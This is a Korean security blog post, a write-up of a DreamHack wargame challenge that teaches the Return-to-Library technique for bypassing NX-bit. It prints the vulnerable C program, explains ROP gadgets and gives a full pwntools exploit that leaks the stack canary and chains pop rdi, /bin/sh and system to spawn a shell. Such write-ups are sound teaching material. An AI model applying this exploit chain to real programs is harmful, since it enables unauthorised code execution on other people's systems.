@@ -1,0 +1,129 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] RTL · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ # 시험기간이 있었던 바람에 최근 포스팅한 게시글 중 일부 예제를 직접 만들지는 못했습니다. # 다음 실습부터 다시 직접 예제를 만들며 진행하겠습니다. RTL Return to Library는 메모리 보호 기법 중 하나인 NX-bit를 우회하기 위한">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-rtl/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-rtl/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-rtl/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] RTL · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ # 시험기간이 있었던 바람에 최근 포스팅한 게시글 중 일부 예제를 직접 만들지는 못했습니다. # 다음 실습부터 다시 직접 예제를 만들며 진행하겠습니다. RTL Return to Library는 메모리 보호 기법 중 하나인 NX-bit를 우회하기 위한"><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-rtl/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] RTL","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ # 시험기간이 있었던 바람에 최근 포스팅한 게시글 중 일부 예제를 직접 만들지는 못했습니다. # 다음 실습부터 다시 직접 예제를 만들며 진행하겠습니다. RTL Return to Library는 메모리 보호 기법 중 하나인 NX-bit를 우회하기 위한","datePublished":"2023-10-22","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-rtl/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-rtl/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] RTL</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ # 시험기간이 있었던 바람에 최근 포스팅한 게시글 중 일부 예제를 직접 만들지는 못했습니다. # 다음 실습부터 다시 직접 예제를 만들며 진행하겠습니다. RTL Return to Library는 메모리 보호 기법 중 하나인 NX-bit를 우회하기 위한</p><div class="article-meta"><time datetime="2023-10-22">2023년 10월 22일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다.</strong> <strong>※</strong> </p>
+<p><strong># 시험기간이 있었던 바람에 최근 포스팅한 게시글 중 일부 예제를 직접 만들지는 못했습니다.</strong></p>
+<p><strong># 다음 실습부터 다시 직접 예제를 만들며 진행하겠습니다.</strong> </p>
+<h3>RTL</h3>
+<p>Return to Library는 메모리 보호 기법 중 하나인 NX-bit를 우회하기 위한 공격기법이다.</p>
+<p>해당 기법은 DreamHack의 문제를 가지고 진행하겠다.</p>
+<p><img src="/assets/images/tistory/tistory-fb026a46c243/001.png" alt=""></p>
+<p>보호기법을 살펴보면 NX-bit가 켜져있는 것을 볼 수 있다.</p>
+<p><img src="/assets/images/tistory/tistory-fb026a46c243/002.png" alt=""></p>
+<p>gdb의 vmmap으로 권한을 확인한 모습이다.</p>
+<p>NX-bit에 의해 스택에 실행권한이 빠져있는 것을 볼 수 있다. </p>
+<p>때문에 Shellcode 같은 Byte code를 사용하는 것은 불가능에 가깝다.</p>
+<p>이를 우회하기 위해서 실행권한이 남아있는 영역 중 하나인 라이브러리의 코드 영역이다.</p>
+<p>공유 라이브러리에는 system, execve 같은 셸을 실행시킬 수 있는 함수들이 존재하기 때문에</p>
+<p>해당 함수들을 사용하여 /bin/sh를 인자로 사용할 수 있다면 셸을 얻을 수 있다.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+const char* binsh = &quot;/bin/sh&quot;;
+
+int main() {
+  char buf[0x30];
+
+  setvbuf(stdin, 0, _IONBF, 0);
+  setvbuf(stdout, 0, _IONBF, 0);
+
+  // Add system function to plt's entry
+  system(&quot;echo 'system@plt&quot;);
+
+  // Leak canary
+  printf(&quot;[1] Leak Canary\n&quot;);
+  printf(&quot;Buf: &quot;);
+  read(0, buf, 0x100);
+  printf(&quot;Buf: %s\n&quot;, buf);
+
+  // Overwrite return address
+  printf(&quot;[2] Overwrite return address\n&quot;);
+  printf(&quot;Buf: &quot;);
+  read(0, buf, 0x100);
+
+  return 0;
+}
+</code></pre>
+<p>문제 코드를 보면 canary를 우회할 수 있는 취약점이 존재한다.</p>
+<p>그리고 /bin/sh 문자열이 코드에 존재한다.</p>
+<p>해당 부분을 이용하면 system의 인자로 사용할 수 있을 것이다.</p>
+<p>system함수의 인자는 1개를 필요로 하기 때문에 pop rdi라는 가젯을 이용하고,</p>
+<p>system함수로 ret하면 될 것이다.</p>
+<p>더보기</p>
+<h4>가젯이란?</h4>
+<p>일반적으로 '코드 조각’을 의미한다.</p>
+<p>이렇게만 보면 이게 무슨 소리인가 싶을 것이다.</p>
+<p>ret 가젯을 예로 설명하겠다.</p>
+<p>ret 가젯은 말 그대로 ret 명령을 실행하기 위한 코드 조각이다.</p>
+<p><img src="/assets/images/tistory/tistory-fb026a46c243/003.png" alt=""></p>
+<p>위 그림은 main함수의 종료 부분이다.</p>
+<p>main함수를 비룻한 함수들은 다시 복귀할 때 ret라는 어셈블리어를 사용한다.</p>
+<p>이때 사용되는 ret의 주소인 0x4012ce가 ret 가젯이 될 수 있다.</p>
+<p>이렇게 disassemble을 했을 때 pop rdi, rsi, ret 등의 코드들이 있을 것인데</p>
+<p>이 부분을 코드 조각 즉 '<strong>가젯</strong>’이라고 한다.</p>
+<p>우선, canary 부분에서 다뤘었던 canary leak을 수행한다.</p>
+<p>그리고 나서 페이로드를 구성하면 되는데,</p>
+<p>pr + binsh + system 순으로 넣어주면 된다.</p>
+<p><img src="/assets/images/tistory/tistory-fb026a46c243/004.png" alt=""></p>
+<p>가젯은 pop rdi; ret;인 0x400853을 이용하면 된다.</p>
+<pre><code>from pwn import*
+
+p = remote('host3.dreamhack.games',19862)
+#p = process('./rtl')
+e = ELF('./rtl')
+
+#context.log_level='debug'
+
+payload =  b'A'*0x39
+
+p.sendafter(b'Buf: ', payload)
+p.recvuntil(payload)
+
+cny = u64(b'\x00'+p.recvn(7))
+print(&quot;canary : &quot;, hex(cny))
+
+system_add = e.sym['system']
+binsh_add = next(e.search(b'/bin/sh'))
+p_rdi = 0x0000000000400853
+ret = 0x0000000000400285
+
+payload = b''
+payload += b'a'*0x38
+payload += p64(cny)
+payload += b'a'*0x8
+payload += p64(ret)
+payload += p64(p_rdi)
+payload += p64(binsh_add)
+payload += p64(system_add)
+
+p.sendafter(b&quot;Buf: &quot;, payload)
+
+p.interactive()
+</code></pre>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-rtl/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
